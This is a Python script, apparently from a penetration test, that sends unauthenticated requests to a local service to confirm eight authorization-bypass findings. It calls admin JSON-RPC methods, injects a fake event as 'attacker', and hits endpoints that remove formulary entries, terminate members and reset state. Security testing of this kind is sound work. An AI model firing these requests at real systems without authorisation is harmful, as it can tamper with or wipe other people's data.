import requests
import json

BASE_URL = "http://host.docker.internal:3030"

tests = [
    {
        "name": "Test 1: AUTHZ-VULN-01 - Admin RPC bypass via l2_forceBatch",
        "method": "POST",
        "url": f"{BASE_URL}/rpc",
        "headers": {"Content-Type": "application/json"},
        "body": {"jsonrpc": "2.0", "method": "l2_forceBatch", "params": {}, "id": 1},
    },
    {
        "name": "Test 2: AUTHZ-VULN-01 - Admin RPC bypass via l2_storeFormulary",
        "method": "POST",
        "url": f"{BASE_URL}/rpc",
        "headers": {"Content-Type": "application/json"},
        "body": {"jsonrpc": "2.0", "method": "l2_storeFormulary", "params": {"entries": []}, "id": 2},
    },
    {
        "name": "Test 3: AUTHZ-VULN-01 - Admin RPC bypass via l2_recordFill",
        "method": "POST",
        "url": f"{BASE_URL}/rpc",
        "headers": {"Content-Type": "application/json"},
        "body": {
            "jsonrpc": "2.0",
            "method": "l2_recordFill",
            "params": {
                "memberWalletId": "test",
                "ndcHash": "test",
                "quantity": 10,
                "daysSupply": 30,
                "copay": 10
            },
            "id": 3
        },
    },
    {
        "name": "Test 4: AUTHZ-VULN-02 - Viz emit auth bypass",
        "method": "POST",
        "url": f"{BASE_URL}/viz/emit",
        "headers": {"Content-Type": "application/json"},
        "body": {
            "type": "test_event",
            "actor": "attacker",
            "data": {"message": "unauthorized_injection"},
            "lane": "test"
        },
    },
    {
        "name": "Test 5: AUTHZ-VULN-03 - Interactive force-batch",
        "method": "POST",
        "url": f"{BASE_URL}/interactive/force-batch",
        "headers": {"Content-Type": "application/json"},
        "body": {},
    },
    {
        "name": "Test 6: AUTHZ-VULN-04 - Interactive update-formulary",
        "method": "POST",
        "url": f"{BASE_URL}/interactive/update-formulary",
        "headers": {"Content-Type": "application/json"},
        "body": {"ndcHash": "test_drug_hash", "action": "REMOVE"},
    },
    {
        "name": "Test 7: AUTHZ-VULN-05 - Interactive terminate-member",
        "method": "POST",
        "url": f"{BASE_URL}/interactive/terminate-member",
        "headers": {"Content-Type": "application/json"},
        "body": {"memberWalletId": "test_wallet_id"},
    },
    {
        "name": "Test 8: AUTHZ-VULN-06 - Interactive reset",
        "method": "POST",
        "url": f"{BASE_URL}/interactive/reset",
        "headers": {"Content-Type": "application/json"},
        "body": {},
    },
]

for test in tests:
    print("=" * 80)
    print(f"  {test['name']}")
    print("=" * 80)
    try:
        resp = requests.request(
            method=test["method"],
            url=test["url"],
            headers=test["headers"],
            json=test["body"],
            timeout=10
        )
        print(f"Status Code: {resp.status_code}")
        print("Response Headers:")
        for k, v in resp.headers.items():
            print(f"  {k}: {v}")
        print("Response Body:")
        try:
            print(json.dumps(resp.json(), indent=2))
        except Exception:
            print(resp.text)
    except Exception as e:
        print(f"ERROR: {e}")
    print()
